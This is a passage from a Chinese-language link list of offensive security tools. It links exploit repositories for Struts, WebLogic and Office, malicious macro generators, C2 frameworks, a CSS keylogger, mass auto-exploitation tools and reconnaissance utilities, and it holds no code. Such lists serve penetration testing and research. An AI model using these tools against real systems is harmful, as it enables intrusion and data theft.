payload</p></li><li><p><a href="https://github.com/RetireJS/grunt-retire">https://github.com/RetireJS/grunt-retire</a> 扫描 js 扩展库的常见漏洞</p></li><li><p><a href="https://github.com/coffeehb/SSTIF">https://github.com/coffeehb/SSTIF</a> 服务器端模板注入漏洞的半自动化工具</p></li><li><p><a href="https://github.com/tijme/angularjs-csti-scanner">https://github.com/tijme/angularjs-csti-scanner</a> 探测客户端 AngularJS 模板注入漏洞工具</p></li><li><p><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a> Jenkins 漏洞探测、用户抓取爆破</p></li><li><p><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> 服务器端模板注入漏洞检测与利用工具</p></li><li><p><a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a> Java,IIS 短文件名暴力枚举漏洞利用工具</p></li><li><p><a href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a> py2,IIS 短文件名漏洞扫描</p></li><li><p><a href="https://github.com/rudSarkar/crlf-injector">https://github.com/rudSarkar/crlf-injector</a> CRLF 注入漏洞批量扫描</p></li><li><p><a href="https://github.com/hahwul/a2sv">https://github.com/hahwul/a2sv</a> SSL 漏洞扫描，例如心脏滴血漏洞等</p></li><li><p><a href="https://github.com/jagracey/Regex-DoS">https://github.com/jagracey/Regex-DoS</a> RegEx 拒绝服务扫描器</p></li><li><p><a href="https://github.com/Bo0oM/PHP_imap_open_exploit">https://github.com/Bo0oM/PHP_imap_open_exploit</a> 利用 imap_open 绕过 php exec 函数禁用</p></li><li><p><a href="https://www.anquanke.com/post/id/106488">https://www.anquanke.com/post/id/106488</a> 利用 mysql 服务端恶意配置读取客户端文件，（如何利用 MySQL LOCAL INFILE 读取客户端文件，Read MySQL Client’s File，【技术分享】从 MySQL 出发的反击之路）</p></li><li><p><a href="https://www.waitalone.cn/awvs-poc.html">https://www.waitalone.cn/awvs-poc.html</a> CVE-2015-4027，AWVS10 命令执行漏洞</p></li><li><p><a href="http://an7isec.blogspot.com/2014/04/pown-noobs-acunetix-0day.html">http://an7isec.blogspot.com/2014/04/pown-noobs-acunetix-0day.html</a> Pwn the n00bs - Acunetix 0day，awvs8 命令执行漏洞</p></li><li><p><a href="https://github.com/numpy/numpy/issues/12759">https://github.com/numpy/numpy/issues/12759</a> 科学计算框架 numpy 命令执行 RCE 漏洞</p></li><li><p><a href="https://github.com/petercunha/Jenkins-PreAuth-RCE-PoC">https://github.com/petercunha/Jenkins-PreAuth-RCE-PoC</a> jenkins 远程命令执行</p></li><li><p><a href="https://github.com/WyAtu/CVE-2018-20250">https://github.com/WyAtu/CVE-2018-20250</a> WinRar 执行漏洞加使用介绍</p></li></ul><h2 id="物联网路由工控漏洞收集"><a href="#物联网路由工控漏洞收集" class="headerlink" title="物联网路由工控漏洞收集#"></a><strong>物联网路由工控漏洞收集</strong>#</h2><ul><li><p><a href="https://github.com/yassineaboukir/CVE-2018-0296">https://github.com/yassineaboukir/CVE-2018-0296</a> 测试思科 ASA 路径穿越漏洞，可获取系统详细信息</p></li><li><p><a href="https://github.com/seclab-ucr/tcp_exploit">https://github.com/seclab-ucr/tcp_exploit</a> 利用 tcp 漏洞使无线路由器产生隐私泄露</p></li><li><p><a href="https://github.com/ezelf/CVE-2018-9995_dvr_credentials">https://github.com/ezelf/CVE-2018-9995_dvr_credentials</a> CVE-2018-9995 摄像头路由，Get DVR Credentials</p></li></ul><h2 id="Java-反序列化漏洞收集"><a href="#Java-反序列化漏洞收集" class="headerlink" title="Java 反序列化漏洞收集#"></a><strong>Java 反序列化漏洞收集</strong>#</h2><ul><li><p><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a> java 反序列化利用</p></li><li><p><a href="https://github.com/GoSecure/break-fast-serial">https://github.com/GoSecure/break-fast-serial</a> 借助 DNS 解析来检测 Java 反序列化漏洞工具</p></li><li><p><a href="https://github.com/s1kr10s/Apache-Struts-v3">https://github.com/s1kr10s/Apache-Struts-v3</a> Apache-Struts 漏洞利用工具</p></li><li><p><a href="https://github.com/iBearcat/S2-057">https://github.com/iBearcat/S2-057</a> struts2 CVE-2018-11776 漏洞检测工具</p></li><li><p><a href="https://github.com/Ivan1ee/struts2-057-exp">https://github.com/Ivan1ee/struts2-057-exp</a> struts2-057 利用脚本</p></li><li><p><a href="https://github.com/theLSA/s2sniper">https://github.com/theLSA/s2sniper</a> struts2 漏洞的检测工具</p></li><li><p><a href="https://github.com/Lucifer1993/struts-scan">https://github.com/Lucifer1993/struts-scan</a> 批量检测 struts 命令执行漏洞</p></li><li><p><a href="https://github.com/lijiejie/struts2_045_scan">https://github.com/lijiejie/struts2_045_scan</a> Struts2-045 漏洞批量扫描工具</p></li><li><p><a href="https://github.com/riusksk/StrutScan">https://github.com/riusksk/StrutScan</a> 基于 perl 的 strut2 的历史漏洞扫描</p></li><li><p><a href="https://github.com/Coalfire-Research/java-deserialization-exploits">https://github.com/Coalfire-Research/java-deserialization-exploits</a> java 反序列化漏洞收集</p></li><li><p><a href="https://github.com/quentinhardy/jndiat">https://github.com/quentinhardy/jndiat</a> weblogic 漏洞利用工具</p></li><li><p><a href="https://github.com/jas502n/CVE-2018-3191">https://github.com/jas502n/CVE-2018-3191</a> Weblogic CVE-2018-3191 远程代码命令执行</p></li><li><p><a href="https://github.com/pyn3rd/CVE-2018-3245">https://github.com/pyn3rd/CVE-2018-3245</a> weblogic cve-2018-2893 与 cve-2018-3245 远程代码命令执行</p></li><li><p><a href="https://github.com/NickstaDB/BaRMIe">https://github.com/NickstaDB/BaRMIe</a> 用于 Java Remote Method Invocation 服务的工具/rmi 的枚举与远程命令执行</p></li><li><p><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a> JBoss 和其他 java 序列化漏洞验证和开发工具</p></li><li><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> java 反序列化利用工具</p></li></ul><h2 id="版本管理平台漏洞收集"><a href="#版本管理平台漏洞收集" class="headerlink" title="版本管理平台漏洞收集#"></a><strong>版本管理平台漏洞收集</strong>#</h2><ul><li><p><a href="https://github.com/shengqi158/svnhack">https://github.com/shengqi158/svnhack</a> .svn 文件夹泄漏利用工具</p></li><li><p><a href="https://www.waitalone.cn/seay-svn-poc-donw-20140505.html">https://www.waitalone.cn/seay-svn-poc-donw-20140505.html</a> Seay-Svn 源代码泄露漏洞利用工具，2014-05-05 版</p></li><li><p><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a> .git 文件利用工具，lijiejie 改进版</p></li><li><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a> .git 文件利用工具</p></li></ul><h2 id="MS-与-Office-漏洞收集"><a href="#MS-与-Office-漏洞收集" class="headerlink" title="MS 与 Office 漏洞收集#"></a><strong>MS 与 Office 漏洞收集</strong>#</h2><ul><li><p><a href="https://github.com/Lz1y/CVE-2017-8759">https://github.com/Lz1y/CVE-2017-8759</a> .NET Framework 换行符漏洞，CVE-2017-8759 完美复现（另附加 hta+powershell 弹框闪烁解决方案）<a href="https://www.freebuf.com/vuls/147793.html">https://www.freebuf.com/vuls/147793.html</a></p></li><li><p><a href="https://github.com/WyAtu/CVE-2018-8581">https://github.com/WyAtu/CVE-2018-8581</a> Exchange 使用完成添加收信规则的操作进行横向渗透和提权漏洞</p></li><li><p><a href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a> PS,用于在 Microsoft Exchange 环境搜索电子邮件查找特定邮件（密码、网络架构信息等）</p></li><li><p><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a> GO,通过 MAPI / HTTP 或 RPC / HTTP 协议远程与 Exchange 服务器进行交互,通过客户端 Outlook 功能远程获取 shell</p></li><li><p><a href="https://github.com/3gstudent/Smbtouch-Scanner">https://github.com/3gstudent/Smbtouch-Scanner</a> 扫描内网永恒之蓝 ETERNAL445SMB 系列漏洞</p></li><li><p><a href="https://github.com/smgorelik/Windows-RCE-exploits">https://github.com/smgorelik/Windows-RCE-exploits</a> windows 命令执行 RCE 漏洞 POC 样本，分为 web 与文件两种形式</p></li><li><p><a href="https://github.com/3gstudent/CVE-2017-8464-EXP">https://github.com/3gstudent/CVE-2017-8464-EXP</a> CVE-2017-8464，win 快捷方式远程执行漏洞</p></li><li><p><a href="https://github.com/Lz1y/CVE-2018-8420">https://github.com/Lz1y/CVE-2018-8420</a> Windows 的 msxml 解析器漏洞可以通过 ie 或 vbs 执行后门</p></li><li><p><a href="https://www.anquanke.com/post/id/163000">https://www.anquanke.com/post/id/163000</a> 利用 Excel 4.0 宏躲避杀软检测的攻击技术分析</p></li><li><p><a href="https://github.com/BuffaloWill/oxml_xxe">https://github.com/BuffaloWill/oxml_xxe</a> XXE 漏洞利用</p></li><li><p><a href="https://thief.one/2017/06/20/1/">https://thief.one/2017/06/20/1/</a> 浅谈 XXE 漏洞攻击与防御</p></li><li><p><a href="https://github.com/thom-s/docx-embeddedhtml-injection">https://github.com/thom-s/docx-embeddedhtml-injection</a> word2016，滥用 Word 联机视频特征执行恶意代码 poc</p></li><li><p><a href="https://blog.cymulate.com/abusing-microsoft-office-online-video">https://blog.cymulate.com/abusing-microsoft-office-online-video</a> word2016，滥用 Word 联机视频特征执行恶意代码介绍</p></li><li><p><a href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads">https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads</a> 无需开启宏即可在 word 文档中利用 DDE 执行命令</p></li><li><p><a href="http://www.freebuf.com/articles/terminal/150285.html">http://www.freebuf.com/articles/terminal/150285.html</a> 无需开启宏即可在 word 文档中利用 DDE 执行命令利用</p></li><li><p><a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a> 利用 word 文档 RTF 获取 shell，<a href="https://evi1cg.me/archives/CVE_2017_11882_exp.html">https://evi1cg.me/archives/CVE_2017_11882_exp.html</a></p></li><li><p><a href="https://github.com/Lz1y/CVE-2017-8759">https://github.com/Lz1y/CVE-2017-8759</a> 利用 word 文档 hta 获取 shell，<a href="http://www.freebuf.com/vuls/147793.html">http://www.freebuf.com/vuls/147793.html</a></p></li><li><p><a href="https://fuping.site/2017/04/18/CVE-2017-0199">https://fuping.site/2017/04/18/CVE-2017-0199</a> 漏洞复现过程 WORD RTF 文档，配合 msf 利用</p></li><li><p><a href="https://github.com/tezukanice/Office8570">https://github.com/tezukanice/Office8570</a> 利用 ppsx 幻灯片远程命令执行，<a href="https://github.com/rxwx/CVE-2017-8570">https://github.com/rxwx/CVE-2017-8570</a></p></li><li><p><a href="https://github.com/0x09AL/CVE-2018-8174-msf">https://github.com/0x09AL/CVE-2018-8174-msf</a> 目前支持的版本是 32 位 IE 浏览器和 32 位 office。网页访问上线，浏览器关闭，shell 依然存活，<a href="http://www.freebuf.com/vuls/173727.html">http://www.freebuf.com/vuls/173727.html</a></p></li><li><p><a href="http://www.4hou.com/technology/9405.html">http://www.4hou.com/technology/9405.html</a> 在 Office 文档的属性中隐藏攻击载荷</p></li><li><p><a href="https://evi1cg.me/archives/Create_PPSX.html">https://evi1cg.me/archives/Create_PPSX.html</a> 构造 PPSX 钓鱼文件</p></li><li><p><a href="https://github.com/enigma0x3/Generate-Macro">https://github.com/enigma0x3/Generate-Macro</a> PowerShell 脚本，生成含有恶意宏的 Microsoft Office 文档</p></li><li><p><a href="https://github.com/mwrlabs/wePWNise">https://github.com/mwrlabs/wePWNise</a> 生成独立于体系结构的 VBA 代码，用于 Office 文档或模板，并自动绕过应用程序控制</p></li><li><p><a href="https://github.com/curi0usJack/luckystrike">https://github.com/curi0usJack/luckystrike</a> 基于 ps，用于创建恶意的 Office 宏文档</p></li><li><p><a href="https://github.com/sevagas/macro_pack">https://github.com/sevagas/macro_pack</a> MS Office 文档、VBS 格式、快捷方式 payload 捆绑</p></li><li><p><a href="https://github.com/khr0x40sh/MacroShop">https://github.com/khr0x40sh/MacroShop</a> 一组通过 Office 宏传递有效载荷的脚本</p></li></ul><h2 id="相关工具拓展插件"><a href="#相关工具拓展插件" class="headerlink" title="相关工具拓展插件#"></a><strong>相关工具拓展插件</strong>#</h2><ul><li><a href="https://github.com/AntSword-Store/">https://github.com/AntSword-Store/</a> 中国蚁剑插件市场</li></ul><h2 id="Kali-环境下拓展插件"><a href="#Kali-环境下拓展插件" class="headerlink" title="Kali 环境下拓展插件#"></a><strong>Kali 环境下拓展插件</strong>#</h2><ul><li><p><a href="https://github.com/secforce/sparta">https://github.com/secforce/sparta</a> py，图形化应用程序联动 Nmap、Nikto、Hydra 等工具</p></li><li><p><a href="https://github.com/Manisso/fsociety">https://github.com/Manisso/fsociety</a> linux 下类似于 kali 的工具包一键安装工具</p></li><li><p><a href="https://github.com/LionSec/katoolin">https://github.com/LionSec/katoolin</a> 使用 linux 服务器自动安装 kali 工具包</p></li><li><p><a href="https://github.com/skavngr/rapidscan">https://github.com/skavngr/rapidscan</a> py2，simple，联动 kali 下工具，漏洞扫描工具</p></li><li><p><a href="https://github.com/koenbuyens/kalirouter">https://github.com/koenbuyens/kalirouter</a> 将 kali 设置为一个路由流量分析系统</p></li></ul><h2 id="Nessus-相关工具拓展插件"><a href="#Nessus-相关工具拓展插件" class="headerlink" title="Nessus 相关工具拓展插件#"></a><strong>Nessus 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://www.tenable.com/downloads/nessus">https://www.tenable.com/downloads/nessus</a></p></li><li><p><a href="https://github.com/se55i0n/Awvs_Nessus_Scanner_API">https://github.com/se55i0n/Awvs_Nessus_Scanner_API</a> 扫描器 Awvs 11 和 Nessus 7 Api 利用脚本</p></li><li><p><a href="https://github.com/DanMcInerney/msf-autoshell">https://github.com/DanMcInerney/msf-autoshell</a> 配合 nessus 扫描结果进行 msf 攻击</p></li><li><p><a href="https://github.com/MooseDojo/apt2">https://github.com/MooseDojo/apt2</a> 联动 nmap、nessus 等工具进行安全测试</p></li></ul><h2 id="Awvs-相关工具拓展插件"><a href="#Awvs-相关工具拓展插件" class="headerlink" title="Awvs 相关工具拓展插件#"></a><strong>Awvs 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://www.52pojie.cn/thread-214819-1-1.html">https://www.52pojie.cn/thread-214819-1-1.html</a> awvs10.5 开发框架破解版</p></li><li><p><a href="https://github.com/fnmsd/awvs_script_decode">https://github.com/fnmsd/awvs_script_decode</a> awvs10.5 规则 scripts 解密版，SDK，开发手册</p></li><li><p><a href="https://github.com/NS-Sp4ce/AWVS11.X-Chinese-Version">https://github.com/NS-Sp4ce/AWVS11.X-Chinese-Version</a> awvs11 汉化包</p></li></ul><h2 id="Burpsuit-相关工具拓展插件"><a href="#Burpsuit-相关工具拓展插件" class="headerlink" title="Burpsuit 相关工具拓展插件#"></a><strong>Burpsuit 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://github.com/PortSwigger">https://github.com/PortSwigger</a> burpsuite 官方插件库</p></li><li><p><a href="https://github.com/snoopysecurity/awesome-burp-extensions">https://github.com/snoopysecurity/awesome-burp-extensions</a> awesome 系列之 burp 拓展</p></li><li><p><a href="https://github.com/d3vilbug/HackBar">https://github.com/d3vilbug/HackBar</a> 集成 hackbar</p></li><li><p><a href="https://github.com/PortSwigger/turbo-intruder">https://github.com/PortSwigger/turbo-intruder</a> 比 Burp 自带的 Intruder 更快，一分钟打 1.61 万次请求</p></li><li><p><a href="https://github.com/Ebryx/AES-Killer">https://github.com/Ebryx/AES-Killer</a> burp 插件，破解 aes 加密的插件</p></li><li><p><a href="https://github.com/bugcrowd/HUNT">https://github.com/bugcrowd/HUNT</a> 可以将 burpsuite 扫描器功能扩展的更加强大，同时支持 zapproxy 扩展</p></li><li><p><a href="https://github.com/wagiro/BurpBounty">https://github.com/wagiro/BurpBounty</a> burp 插件增强主动与被动扫描功能</p></li><li><p><a href="https://github.com/nccgroup/BurpSuiteHTTPSmuggler">https://github.com/nccgroup/BurpSuiteHTTPSmuggler</a> Burp 拓展, 使用几种技巧绕过 WAF</p></li><li><p><a href="https://github.com/PortSwigger/command-injection-attacker">https://github.com/PortSwigger/command-injection-attacker</a> burp 插件，命令注入漏洞检测</p></li><li><p><a href="https://github.com/nccgroup/freddy">https://github.com/nccgroup/freddy</a> burp 插件，自动识别 Java/.NET 应用程序中的反序列化漏洞</p></li><li><p><a href="https://github.com/modzero/interestingFileScanner">https://github.com/modzero/interestingFileScanner</a> burp 插件，增强敏感文件扫描</p></li><li><p><a href="https://github.com/summitt/Burp-Non-HTTP-Extension">https://github.com/summitt/Burp-Non-HTTP-Extension</a> burp 插件，布置 dns 服务器抓取流量</p></li><li><p><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a> burp 拓展，扫描 J2EE 应用</p></li><li><p><a href="https://github.com/JGillam/burp-co2">https://github.com/JGillam/burp-co2</a> 集成了 sqlmap，菜刀，字典生成等</p></li><li><p><a href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a> burp 插件，检测 ssrf 漏洞</p></li></ul><h2 id="Sqlmap-相关工具拓展插件"><a href="#Sqlmap-相关工具拓展插件" class="headerlink" title="Sqlmap 相关工具拓展插件#"></a><strong>Sqlmap 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://github.com/codewatchorg/sqlipy">https://github.com/codewatchorg/sqlipy</a> burp 与 sqlmap 联动插件</p></li><li><p><a href="https://github.com/Hood3dRob1n/SQLMAP-Web-GUI">https://github.com/Hood3dRob1n/SQLMAP-Web-GUI</a> sqlmap 的 web gui</p></li><li><p><a href="https://github.com/KINGSABRI/sqlmap-tamper-api">https://github.com/KINGSABRI/sqlmap-tamper-api</a> 利用各种语言来编写 sqlmapTamper</p></li><li><p><a href="https://github.com/0xbug/SQLiScanner">https://github.com/0xbug/SQLiScanner</a> 一款基于 sqlmapapi 和 Charles 的被动 SQL 注入漏洞扫描工具</p></li><li><p><a href="https://github.com/fengxuangit/Fox-scan">https://github.com/fengxuangit/Fox-scan</a> 基于 sqlmapapi 的主动和被动资源发现的漏洞扫描工具</p></li><li><p><a href="https://github.com/UltimateHackers/sqlmate">https://github.com/UltimateHackers/sqlmate</a> 在 sqlmap 基础上增加了目录扫描、hash 爆破等功能</p></li><li><p><a href="https://github.com/ysrc/GourdScanV2">https://github.com/ysrc/GourdScanV2</a> ysrc 出品的被动式漏洞扫描工具，基于 sqlmapapi</p></li><li><p><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a> 基于 sqlmapapi，ruby 编写的漏洞代理型检测工具</p></li><li><p><a href="https://github.com/jesuiscamille/AutoSQLi">https://github.com/jesuiscamille/AutoSQLi</a> 利用 DorkNet，Googler, Ddgr, WhatWaf 和 sqlmap 自动注入</p></li></ul><h2 id="Nmap-相关工具拓展插件"><a href="#Nmap-相关工具拓展插件" class="headerlink" title="Nmap 相关工具拓展插件#"></a><strong>Nmap 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://github.com/Ullaakut/nmap">https://github.com/Ullaakut/nmap</a> GO，实现的 Nmap 调用库</p></li><li><p><a href="https://github.com/cldrn/nmap-nse-scripts">https://github.com/cldrn/nmap-nse-scripts</a> NSE 收集列表</p></li><li><p><a href="https://github.com/vulnersCom/nmap-vulners">https://github.com/vulnersCom/nmap-vulners</a> 使用 nmap 扫描常见的服务漏洞</p></li><li><p><a href="https://github.com/s4n7h0/Halcyon">https://github.com/s4n7h0/Halcyon</a> Nmap Script (NSE)IDE 编辑器</p></li><li><p><a href="https://github.com/m4ll0k/AutoNSE">https://github.com/m4ll0k/AutoNSE</a> NSE 自动化利用</p></li><li><p><a href="https://github.com/Screetsec/Dracnmap">https://github.com/Screetsec/Dracnmap</a> shell，将 Nmap 复杂的命令进行一定程度的集成与简化，使新用户更加容易上手。</p></li><li><p><a href="https://github.com/cldrn/rainmap-lite">https://github.com/cldrn/rainmap-lite</a> Django，Web 版 Nmap，可以建立新的扫描服务器，允许用户从他们的手机/平板电脑/网络浏览器启动 Nmap 扫描</p></li><li><p><a href="https://github.com/trimstray/sandmap">https://github.com/trimstray/sandmap</a> linux 下将支持使用大量 Nmap 引擎进行网络和系统侦察的工具</p></li><li><p><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a> 基于 nmap 的扫描器，与 cve 漏洞关联</p></li><li><p><a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a> 基于 nmap 的高级漏洞扫描器，命令行环境使用</p></li><li><p><a href="https://github.com/Rev3rseSecurity/WebMap">https://github.com/Rev3rseSecurity/WebMap</a> 将 nmap 的 xml web 展示器</p></li><li><p><a href="https://github.com/DanMcInerney/msf-autopwn">https://github.com/DanMcInerney/msf-autopwn</a> 执行 NMap 扫描或读取扫描结果, 然后自动使用 msf 攻击包含常见漏洞的主机</p></li></ul><h2 id="Metasploit-相关工具拓展插件"><a href="#Metasploit-相关工具拓展插件" class="headerlink" title="Metasploit 相关工具拓展插件#"></a><strong>Metasploit 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit">https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit</a> 结合机器学习与 msf 的全自动测试工具</p></li><li><p><a href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a> 一个可以创建 SSL/TLS shell 连接的脚本</p></li><li><p><a href="https://github.com/DanMcInerney/msf-netpwn">https://github.com/DanMcInerney/msf-netpwn</a> 等待 msf 的 session，并自动提为域管理</p></li><li><p><a href="https://www.exploit-db.com/exploits/45851/">https://www.exploit-db.com/exploits/45851/</a> msf 插件，利用 jira upm 上传进行命令执行</p></li><li><p><a href="https://github.com/NullArray/AutoSploit">https://github.com/NullArray/AutoSploit</a> 利用 Shodan 搜索引擎收集目标, 并自动调用设定的 msf 模块对目标发动攻击</p></li><li><p><a href="https://github.com/WazeHell/metateta">https://github.com/WazeHell/metateta</a> 使用 msf 脚本，根据特定协议进行扫描</p></li><li><p><a href="https://github.com/fbkcs/msf-elf-in-memory-execution">https://github.com/fbkcs/msf-elf-in-memory-execution</a> Metasploit 模块, 用于在内存中执行 ELF 文件</p></li><li><p><a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a> metasploit 双星攻击利用文件</p></li><li><p><a href="https://github.com/darkoperator/Metasploit-Plugins">https://github.com/darkoperator/Metasploit-Plugins</a> msf 扩展资产搜集与帮助插件</p></li><li><p><a href="https://github.com/D4Vinci/One-Lin3r">https://github.com/D4Vinci/One-Lin3r</a> metasploit、payload 辅助查询工具</p></li><li><p><a href="https://github.com/shizzz477/msploitego">https://github.com/shizzz477/msploitego</a> 将 msf 数据库与 maltego 进行图形化展示</p></li><li><p><a href="https://github.com/scriptjunkie/msfgui">https://github.com/scriptjunkie/msfgui</a> metasploit 的 GUI 界面，话说现在 msf 对 windows 支持也挺好的</p></li></ul><h2 id="CobaltStrike-相关工具拓展插件"><a href="#CobaltStrike-相关工具拓展插件" class="headerlink" title="CobaltStrike 相关工具拓展插件#"></a><strong>CobaltStrike 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1NDYxMTE5OA==&mid=2247483977&idx=1&sn=6e517a17a33a17c3e283030e26fdefbf&scene=21#wechat_redirect">https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg</a> 使用 Aggressor 脚本雕饰 Cobalt Strike</p></li><li><p><a href="https://github.com/rsmudge/armitage">https://github.com/rsmudge/armitage</a> CobaltStrike 社区版，调用 msf，一对多带界面</p></li><li><p><a href="https://github.com/anbai-inc/CobaltStrike_Hanization">https://github.com/anbai-inc/CobaltStrike_Hanization</a> CobaltStrike2.5 汉化版，以 msf 库为基础，3.0 以后改版</p></li><li><p><a href="https://github.com/rsmudge/cortana-scripts">https://github.com/rsmudge/cortana-scripts</a> 用于 cs2.x 与 armitage 的可拓展插件，cvs3.x 的为 AggressorScripts</p></li><li><p><a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a> cs3.0 以后的脚本搜集</p></li><li><p><a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a> cs3.x 自动化攻击脚本集合</p></li><li><p><a href="https://github.com/Ridter/CS_Chinese_support/">https://github.com/Ridter/CS_Chinese_support/</a> cs3.0 传输信息的汉化插件</p></li><li><p><a href="https://github.com/verctor/CS_xor64">https://github.com/verctor/CS_xor64</a> 生成 cobaltstrike 所需的 xor64.bin</p></li><li><p><a href="https://github.com/ryhanson/ExternalC2">https://github.com/ryhanson/ExternalC2</a> 一个用于将通信渠道与 Cobalt Strike External C2 服务器集成的库</p></li><li><p><a href="https://github.com/threatexpress/cs2modrewrite">https://github.com/threatexpress/cs2modrewrite</a> 用于将 Cobalt Strike 配置文件转换为 mod_rewrite 脚本的工具</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/CatMyFish">https://github.com/Mr-Un1k0d3r/CatMyFish</a> 搜索分类域，为 Cobalt Strike beacon C&amp;C 设置白名单域</p></li><li><p><a href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a> 利用 jquery 文件进行 C2 通讯，在文件内做了 JS 混淆绕过防火墙</p></li><li><p><a href="https://github.com/dcsync/pycobalt">https://github.com/dcsync/pycobalt</a> py3,Python API for Cobalt Strike</p></li><li><p><a href="https://www.cobaltstrike.com/aggressor-script/cobaltstrike.html">https://www.cobaltstrike.com/aggressor-script/cobaltstrike.html</a> CobaltStrike 相关插件编写，一对多带界面</p></li></ul><h2 id="Empire-相关工具拓展插件"><a href="#Empire-相关工具拓展插件" class="headerlink" title="Empire 相关工具拓展插件#"></a><strong>Empire 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://paper.tuisec.win/detail/f3dce68a0b4baaa">https://paper.tuisec.win/detail/f3dce68a0b4baaa</a> 利用 Empire 获取域控权限</p></li><li><p><a href="https://github.com/EmpireProject/Empire-GUI">https://github.com/EmpireProject/Empire-GUI</a> empire 的 node.js 界面</p></li><li><p><a href="https://github.com/interference-security/empire-web">https://github.com/interference-security/empire-web</a> empire 的 web 界面</p></li><li><p><a href="https://github.com/byt3bl33d3r/DeathStar">https://github.com/byt3bl33d3r/DeathStar</a> py3,调用 Empire RESTful API 自动化获取域管权限的</p></li><li><p><a href="https://github.com/infosecn1nja/e2modrewrite">https://github.com/infosecn1nja/e2modrewrite</a> 用于将 Empire 配置文件转换为 Apache modrewrite 脚本</p></li><li><p><a href="https://github.com/maxchehab/CSS-Keylogging">https://github.com/maxchehab/CSS-Keylogging</a> Chrome 扩展程序和 Express 服务器利用 CSS 的键盘记录功能。</p></li><li><p><a href="https://github.com/evilcos/cookiehacker">https://github.com/evilcos/cookiehacker</a> Chrome 扩展程序。JavaScript document.cookie / Wireshark Cookie</p></li><li><p><a href="https://github.com/lfzark/cookie-injecting-tools">https://github.com/lfzark/cookie-injecting-tools</a> Chrome 扩展，cookie 注入工具包括注入，编辑，添加和删除 cookie</p></li></ul><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集#"></a><strong>信息搜集</strong>#</h2><ul><li><p><a href="https://github.com/smicallef/spiderfoot">https://github.com/smicallef/spiderfoot</a> 利用 OSINT 自动化找出对方信息，gui 界面，插件化</p></li><li><p><a href="https://github.com/Nhoya/gOSINT">https://github.com/Nhoya/gOSINT</a> go，利用 OSINT 自动化搜集信息</p></li><li><p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a> 企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts</p></li><li><p><a href="https://github.com/guelfoweb/knock">https://github.com/guelfoweb/knock</a> 通过爆破进行子域名获取，可用于查找子域名接管漏洞</p></li><li><p><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a> 通过搜索引擎与爆破快速子域枚举工具</p></li><li><p><a href="https://github.com/Ice3man543/subfinder">https://github.com/Ice3man543/subfinder</a> 基于 go 实现的 Sublist3r</p></li><li><p><a href="https://github.com/yanxiu0614/subdomain3">https://github.com/yanxiu0614/subdomain3</a> py3、py2 的子域名,IP,CDN 信息等</p></li><li><p><a href="https://github.com/caffix/amass">https://github.com/caffix/amass</a> 基于 go，子域名枚举, 搜索互联网数据源, 使用机器学习猜测子域名</p></li><li><p><a href="https://github.com/nahamsec/lazyrecon">https://github.com/nahamsec/lazyrecon</a> 侦查 reconnaissance 过程自动化脚本, 可自动使用 Sublist3r/certspotter 获取子域名, 调用 nmap/dirsearch 等</p></li><li><p><a href="https://github.com/s0md3v/ReconDog">https://github.com/s0md3v/ReconDog</a> simple，侦查信息的瑞士军刀</p></li><li><p><a href="https://github.com/FeeiCN/ESD">https://github.com/FeeiCN/ESD</a> py3，爆破搜集子域名</p></li><li><p><a href="https://github.com/alpha1e0/pentestdb">https://github.com/alpha1e0/pentestdb</a> 多用途集成化信息搜集工具</p></li><li><p><a href="https://github.com/se55i0n/PortScanner">https://github.com/se55i0n/PortScanner</a> py2,目标 tcp 端口快速扫描、banner 识别、cdn 检测</p></li><li><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a> lijiejie 开发的一款使用广泛的子域名爆破枚举工具</p></li><li><p><a href="https://github.com/ring04h/wydomain">https://github.com/ring04h/wydomain</a> 